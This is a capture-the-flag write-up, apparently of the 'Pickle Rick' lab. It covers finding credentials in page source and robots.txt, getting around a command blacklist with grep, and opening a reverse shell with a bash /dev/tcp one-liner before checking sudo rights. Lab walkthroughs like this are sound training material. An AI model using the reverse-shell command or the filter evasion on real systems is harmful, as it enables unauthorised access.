## We got 2 ports up , 22 and 80

## Opening up port 80 from the browser, and reading the source code I get :

 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
## We have a username : R1ckRul3s , and viewing the robots.txt file I get something (a weird string) : Wubbalubbadubdub

## I assume that might be the password of the username or a path, but nope it’s obviously not a path since it’s giving 404 Not Found error.

## I now perform a directory search , to look for any file/folder that is available.


## We get login.php , and that’s look valid:)

## I use the username and password(I guess) that we found earlier , from comment and robots.txt to login:

username : R1ckRul3s
password : Wubbalubbadubdub

## I was able to Run commands after loggin in .!

## Except trying to read a file using cat I was receiving a weird GIF , that insulted my skills:

## Basically it has some commands that are blacklisted , but we can still read the files, I hope!

## Using grep . <filename> I was able to read the files.

## I now grab my revshell , I first check if nc or netcat is in the system , and luckily it is in the system:

## but despite it being there it doesn’t actually seem to execute / work.

## with bash -c "bash -i &>/dev/tcp/<ip>/<port> <&1" I was able to get a reverse shell and the second ingredient was in /home/rick and the third ingredient was in /root/

Running sudo -l I was able to see that I have permission to run as sudo in the whole system without having to enter a password:
